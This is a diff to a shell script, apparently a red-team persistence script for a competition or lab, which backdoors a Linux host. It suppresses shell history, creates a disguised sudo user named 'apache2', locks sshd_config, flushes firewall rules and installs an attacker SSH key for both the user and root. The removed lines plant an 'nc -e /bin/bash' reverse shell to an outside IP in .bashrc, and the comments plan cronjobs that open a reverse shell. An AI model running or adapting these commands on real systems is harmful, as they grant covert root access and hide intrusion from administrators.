@@ -1,7 +1,9 @@
 #!/bin/sh
 
+# Paul Vickers - pmv6497@rit.edu
+
 # No history
-HISTCONTROL=ignore both
+HISTCONTROL=ignoreboth
 
 # First, we're going to create a new user account named apache2 with home directory
 # /var/www/apache2 to look somewhat legitimate, and add it to the sudo group
@@ -19,10 +21,13 @@ sudo chattr +i /etc/ssh/sshd_config
 # Flush iptables rules, may also do this in a cronjob
 sudo iptables -F
 
-# Use bashrc file to create a reverse shell when user logs in - make sure directory is correct
-cd /home/ubuntu
-sudo sed -i '$anc -e /bin/bash 100.64.2.9 7681 2>/dev/null &' .bashrc
-sudo chattr +i .bashrc
+#Add SSH key that was copied over into authorized keys for both this user and root
+sudo cp sshkey .ssh/authorized_keys
+sudo cp sshkey /root/.ssh/authorized_keys
+sudo chmod 700 .ssh
+sudo chmod 700 /root/.ssh
+sudo chmod 600 .ssh/authorized_keys
+sudo chmod 600 /root/.ssh/authorized_keys
 
 # Finally, launch setup for manual cronjobs - planning to have some stopping services
 # and also one to open up a backdoor for a reverse tcp shell
